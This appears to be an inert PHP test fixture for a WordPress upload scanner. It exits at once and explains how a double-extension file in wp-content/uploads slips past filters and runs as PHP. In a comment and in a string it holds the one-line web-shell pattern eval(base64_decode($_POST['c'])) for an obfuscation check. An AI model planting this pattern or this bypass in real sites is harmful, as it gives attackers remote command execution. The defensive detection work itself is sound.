<?php
exit; // Inert fixture. This file stops here and never executes anything below.

/*
 * FAILING: nothing in WordPress writes a PHP file into wp-content/uploads.
 * The double extension is the giveaway. Upload filters that read only the
 * first extension see a JPEG, and Apache handlers that read the last one
 * see PHP.
 *
 * The strings below are what a responder actually finds in a file like this.
 * They are kept inside a comment and behind an exit so that nothing in this
 * repository can run, and so the pattern is still visible to a reader and to
 * the obfuscation check.
 *
 *   eval(base64_decode($_POST['c']));
 */
$sample_payload_shape = 'eval(base64_decode($_POST[c]))';
